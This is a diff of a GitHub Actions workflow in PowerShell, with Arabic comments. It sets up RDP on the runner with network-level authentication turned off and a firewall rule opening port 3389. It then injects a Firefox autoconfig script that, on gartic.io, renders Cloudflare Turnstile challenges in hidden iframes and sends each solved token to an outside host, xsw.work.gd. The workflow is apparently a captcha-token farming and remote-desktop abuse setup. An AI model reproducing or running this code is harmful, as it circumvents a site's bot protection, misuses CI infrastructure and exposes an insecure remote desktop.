@@ -24,19 +24,33 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Inject Gartic Script (Direct Method)
+      - name: 2. Inject Gartic Script (Step-by-Step Method)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
           
-          # إعدادات التفعيل
+          # إعدادات ملف التفعيل
           $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
           $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
 
-          # كتابة السكربت بطريقة هادئة بدون Base64 لتجنب أخطاء التحويل
-          $script = '//' + "`n" + 'try { window.addEventListener("load", function() { if (location.href.includes("gartic.io")) { setInterval(function() { location.reload(); }, 50000); function sendToken(t) { if (typeof t !== "string" || t.length <= 20) return; fetch("https://www.xsw.work.gd/add-token", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token: t }) }).catch(function() {}); } window.addEventListener("message", function(e) { if (e.data && typeof e.data === "string") { sendToken(e.data); } }); for (var i = 0; i < 6; i++) { var f = document.createElement("iframe"); f.style.display = "none"; f.sandbox = "allow-scripts allow-same-origin"; document.body.appendChild(f); f.srcdoc = "<html><head><script src=''https://challenges.cloudflare.com/turnstile/v0/api.js'' async defer></script></head><body><div id=''cf-turnstile''></div><script>function r(){try{window.turnstile.render(''#cf-turnstile'',{sitekey:''0x4AAAAAABBPKaIbNwnPEfSo'',callback:function(t){parent.postMessage(t,''*'');}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>"; } } }); } catch (e) {}'
-          
-          $script | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
+          # كتابة السكربت سطر سطر لضمان الدقة (هاد السر اللي رح يحل المشكلة)
+          "//" | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII
+          "try {" | Add-Content "$firefoxDir\mozilla.cfg"
+          "  window.addEventListener('load', function() {" | Add-Content "$firefoxDir\mozilla.cfg"
+          "    if (location.href.includes('gartic.io')) {" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      setInterval(function() { location.reload(); }, 50000);" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      function sendToken(t) {" | Add-Content "$firefoxDir\mozilla.cfg"
+          "        if (typeof t !== 'string' || t.length <= 20) return;" | Add-Content "$firefoxDir\mozilla.cfg"
+          "        fetch('https://www.xsw.work.gd/add-token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t }) }).catch(function() {});" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      }" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      window.addEventListener('message', function(e) { if (e.data && typeof e.data === 'string') { sendToken(e.data); } });" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      for (var i = 0; i < 6; i++) {" | Add-Content "$firefoxDir\mozilla.cfg"
+          "        var f = document.createElement('iframe'); f.style.display = 'none'; f.sandbox = 'allow-scripts allow-same-origin'; document.body.appendChild(f);" | Add-Content "$firefoxDir\mozilla.cfg"
+          "        f.srcdoc = '<html><head><script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js\" async defer></script></head><body><div id=\"cf-turnstile\"></div><script>function r(){try{window.turnstile.render(\"#cf-turnstile\",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>';" | Add-Content "$firefoxDir\mozilla.cfg"
+          "      }" | Add-Content "$firefoxDir\mozilla.cfg"
+          "    }" | Add-Content "$firefoxDir\mozilla.cfg"
+          "  });" | Add-Content "$firefoxDir\mozilla.cfg"
+          "} catch (e) {}" | Add-Content "$firefoxDir\mozilla.cfg"
 
       - name: 3. Create RDP User & Setup Startup
         run: |
